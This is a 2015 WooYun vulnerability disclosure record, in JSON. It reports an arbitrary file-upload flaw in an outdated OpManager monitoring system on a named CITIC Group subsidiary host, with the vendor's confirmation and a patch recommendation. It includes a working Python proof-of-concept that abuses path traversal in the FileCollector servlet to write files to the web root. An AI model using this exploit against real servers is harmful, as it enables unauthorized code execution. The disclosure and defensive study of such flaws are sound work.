{"id": 44836, "wybug_id": "wooyun-2015-098497", "wybug_title": "中信集团旗下某商城运维监控系统存在文件上传可获取系统权限", "wybug_corp": "中信集团", "wybug_author": "plane636", "wybug_date": "2015-02-27 11:25", "wybug_open_date": "2015-04-13 16:58", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-02-27：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-03-04：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-03-14：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-03-24：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-04-03：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-04-13：\t细节向公众公开  简要描述： opmanager版本过低,附自己用python写的验证程序 详细说明：  存在问题的站点：http://ns1.dchnu.com使用了低版本的opmanager，存在上传漏洞，该系统是以admin权限跑的，可直接system权限执行命令。具体的危害和利用方式可参考我以前发的漏洞。 WooYun: 易车网某运维监控系统文件上传任意命令执行&SQL注入 自己写了一个验证程序，可以简单测测，不用搞metaspolit那么麻烦了。\n#-*-coding:utf-8-*-import sys, httplib,webbrowserfrom optparse import OptionParserparser = OptionParser()parser.add_option(\"-t\",\"--target\",dest=\"host\",help=\"press the target host,not include http://\",metavar=\"HOST\")parser.add_option(\"-p\",\"--port\",dest=\"port\",default='80',help=\"press the port,default 80\")(options,args) = parser.parse_args()print options.host,options.portif options.host==None:    print 'ERROR:please press the correct target'    exit()host = options.host+':'+options.portparams = \"test by w00yun\"   #上传内容filename = 'test1.txt'       #上传文件名url = \"/servlet/com.me.opmanager.extranet.remote.communication.fw.fe.FileCollector?regionID=../../../&FILENAME=\"+filenameurl1 = 'http://'+host+'/'+filenameheaders = {    \"Content-Type\": \"application/xml\",    \"Accept-Encoding\": \"gzip, deflate\",    \"User-Agent\": \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)\",    \"Host\": host,    \"Connection\": \"Keep-Alive\",    \"Cache-Control\": \"no-cache\"}con2 = httplib.HTTPConnection(host)con2.request(\"POST\", url, params, headers)r2 = con2.getresponse()if r2.status == 500:    print \"Success\", \"\\n\"    webbrowser.open_new_tab(url1)else:    print \"Failed\", \"\\n\"con2.close()\n可以-h看下使用方法   漏洞证明：  \n\n\n\n\n\n   修复方案：  更新版本打补丁   版权声明：转载请注明来源 plane636@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：11  确认时间：2015-03-04 08:32 厂商回复： CNVD确认并复现所述情况,已经转由CNCERT转发给中信集团某直属单位,由其后续协调网站管理单位处置. 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 11, "Ranks": null}